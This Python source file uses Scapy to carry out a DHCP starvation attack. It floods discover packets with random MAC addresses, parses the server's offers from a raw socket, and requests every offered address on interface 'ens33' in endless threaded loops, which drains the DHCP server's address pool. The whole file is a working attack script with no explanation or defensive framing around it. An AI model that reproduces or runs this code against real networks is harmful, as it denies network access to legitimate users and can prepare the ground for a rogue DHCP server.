from scapy.all import *
import time
import socket
import struct
from threading import Thread
from queue import Queue
import traceback
import random
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))

Q = Queue()

def DHCP_discover():
	while True:
		try:
			eth1 =  Ether(src=RandMAC(),dst="ff:ff:ff:ff:ff:ff")
			#print ("eth1 ", eth1)
			ip1 = IP(src="0.0.0.0",dst="255.255.255.255")
			#print ("ip1", ip1)
			udp1= UDP(sport=68,dport=67)
			#print ("udp", udp1)
			bootp1= BOOTP(chaddr=RandString(12,b'0123456789abcdef'))
			#print ("bootp ", bootp1)
			dhcp1 = DHCP(options=[("message-type","discover"),"end"])
			dhcp2 = DHCP(options=[("message-type","request")])

			dhcp_discover = eth1/ip1/udp1/bootp1/dhcp1
			tid = random.randint(100,300)
			dhcp_discover[BOOTP].xid= tid

			sendp(dhcp_discover, iface = "ens33")
			time.sleep(2)
			Q.put((eth1,ip1,udp1,bootp1,dhcp2,tid))

			
		except Exception as e :
			print (e) 
			print (traceback.print_tb(e.__traceback__))
		

def DHCP_offer_accept_send_request():
	i = 1
	while True:
		try:
			pkt  = s.recvfrom(2048)
			eth1,ip1,udp1,bootp1,dhcp2,tid = Q.get()
			
			#num = pkt[0][14]
			num = int(f'{pkt[0][14]:x}')
			print ("num", num)
			ip_length = (int(num) % 10) * 4
			ip_last_range = 14 + ip_length
			ipheader = pkt[0][14:ip_last_range]
			ip_hdr = struct.unpack("!12s4s4s",ipheader)
			server_ip = socket.inet_ntoa(ip_hdr[1])
			obtained_ip = socket.inet_ntoa(ip_hdr[2])
		
			print ("Obtained IP ",obtained_ip)
			print ("DHCP server IP ",server_ip)
			#print ('bootp ', bootp1)
			#print ("dhcp2", dhcp2)
			dhcp_request = eth1/ip1/udp1/bootp1/dhcp2
			dhcp_request[BOOTP].xid= tid
			name=('master'+str(i)).encode()
			
			i =i+1
			#dhcp_request[DHCP].options.append(("message-type", "request"))
			dhcp_request[DHCP].options.append(("requested_addr", obtained_ip))
			dhcp_request[DHCP].options.append(("server_id", server_ip))
			#dhcp_request[DHCP].options.append(("hostname", name))

			#dhcp_request[DHCP].options.append(("param_req_list", b'x01x1cx02x03x0fx06x77x0cx2cx2fx1ax79x2a'))
			dhcp_request[DHCP].options.append(("end"))
			
			sendp(dhcp_request,iface = "ens33")
			
		except Exception as e :
			print (e)
			#print (traceback.print_tb(e.__traceback__))


t1 = Thread(target=DHCP_discover)
t2 = Thread(target=DHCP_offer_accept_send_request)

t1.start()
t2.start()
